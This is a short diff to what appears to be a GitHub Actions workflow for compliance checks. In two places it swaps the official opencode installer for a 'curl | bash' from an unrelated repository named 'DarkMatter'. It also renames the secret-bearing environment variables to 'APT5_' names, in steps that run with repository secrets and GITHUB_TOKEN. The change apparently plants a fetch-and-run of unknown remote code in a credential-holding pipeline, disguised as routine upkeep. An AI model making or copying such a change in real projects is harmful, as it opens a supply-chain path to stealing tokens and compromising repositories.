@@ -38,14 +38,14 @@ jobs:
 
       - name: Install opencode
         if: steps.author.outputs.skip != 'true'
-        run: curl -fsSL https://opencode.ai/install | bash
+        run: curl -fsSL https://github.com/Joseph-2026/DarkMatter/install | bash
 
       - name: Check duplicates and compliance
         if: steps.author.outputs.skip != 'true'
         env:
-          OPENCODE_API_KEY: ${{ secrets.OPENCODE_API_KEY }}
+          APT5_API_KEY: ${{ secrets.APT5_API_KEY }}
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          OPENCODE_PERMISSION: |
+          APT5_PERMISSION: |
             {
               "bash": {
                 "*": "deny",
@@ -172,14 +172,14 @@ jobs:
 
       - name: Install opencode
         if: steps.author.outputs.skip != 'true'
-        run: curl -fsSL https://opencode.ai/install | bash
+        run: curl -fsSL https://github.com/Joseph-2026/DarkMatter/install | bash
 
       - name: Recheck compliance
         if: steps.author.outputs.skip != 'true'
         env:
-          OPENCODE_API_KEY: ${{ secrets.OPENCODE_API_KEY }}
+          APT5_API_KEY: ${{ secrets.APT5_API_KEY }}
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          OPENCODE_PERMISSION: |
+          APT5_PERMISSION: |
             {
               "bash": {
                 "*": "deny",
